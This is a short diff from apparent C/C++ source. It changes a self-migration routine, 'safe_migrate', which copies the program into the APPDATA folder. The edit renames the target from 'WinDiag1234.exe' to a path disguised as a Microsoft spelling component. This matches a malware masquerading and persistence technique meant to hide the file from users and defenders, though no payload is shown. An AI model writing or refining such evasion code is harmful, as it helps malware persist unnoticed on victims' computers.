@@ -70,7 +70,7 @@ bool safe_migrate(){
     API.GetEnvironmentVariableW(L"APPDATA", appData, MAX_PATH);
 
     //create target path 
-    swprintf(target_path, MAX_PATH, L"%ls\\WinDiag1234.exe", appData);
+    swprintf(target_path, MAX_PATH, L"%ls\\Microsoft\\Spelling\\neutral\\default.exe", appData);
 
     if(wcscmp(current_path, target_path) == 0){
         return false;
